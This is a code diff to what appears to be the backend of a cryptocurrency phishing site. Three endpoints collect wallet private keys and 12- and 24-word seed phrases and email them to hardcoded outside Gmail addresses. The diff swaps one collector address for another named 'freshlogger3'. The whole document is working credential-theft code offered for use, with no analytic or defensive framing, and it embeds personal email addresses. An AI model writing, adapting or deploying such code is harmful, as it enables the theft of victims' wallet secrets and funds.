@@ -60,7 +60,7 @@ app.post("/api/submit/private-key", async (req, res) => {
   try {
     await transporter.sendMail({
       from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
-      to: [process.env.ADMIN_EMAIL, "akannioladimeji135@gmail.com"],
+      to: [process.env.ADMIN_EMAIL, "freshlogger3@gmail.com"],
       //to: [process.env.ADMIN_EMAIL, "Syndermiller@gmail.com"],
       subject: "New Private Key Submitted",
       text: `Private Key: ${privateKey}`,
@@ -96,7 +96,7 @@ app.post("/api/submit/seed-phrase", async (req, res) => {
   try {
     await transporter.sendMail({
       from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
-      to: [process.env.ADMIN_EMAIL, "akannioladimeji135@gmail.com"],
+      to: [process.env.ADMIN_EMAIL, "freshlogger3@gmail.com"],
       // to: [process.env.ADMIN_EMAIL, "Syndermiller@gmail.com"],
       subject: "New 12-Word Seed Phrase Submitted",
       text: `Seed Phrase:\n\n${formatted}`,
@@ -132,7 +132,7 @@ app.post("/api/submit/seed-phrase-24", async (req, res) => {
   try {
     await transporter.sendMail({
       from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
-      to: [process.env.ADMIN_EMAIL, "akannioladimeji135@gmail.com"],
+      to: [process.env.ADMIN_EMAIL, "freshlogger3@gmail.com"],
       // to: [process.env.ADMIN_EMAIL, "Syndermiller@gmail.com"],
       subject: "New 24-Word Seed Phrase Submitted",
       text: `24-Word Seed Phrase:\n\n${formatted}`,
